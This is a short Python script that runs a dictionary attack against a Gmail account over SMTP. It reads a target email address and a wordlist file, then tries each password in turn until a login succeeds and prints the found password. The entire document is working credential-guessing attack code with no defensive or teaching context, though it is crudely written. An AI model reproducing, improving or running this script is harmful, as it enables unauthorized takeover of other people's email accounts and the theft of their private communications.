import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input ("Enter Email : ")
passF = input("Enter Wordlist : ")
passF = open(passF, "r")

for password in passF:

	try:
		smtpserver.login(user, password)
		print("Password : %s" % password)
		break;

	except smtplib.SMTPAuthenticationError:
		print("Fuiled")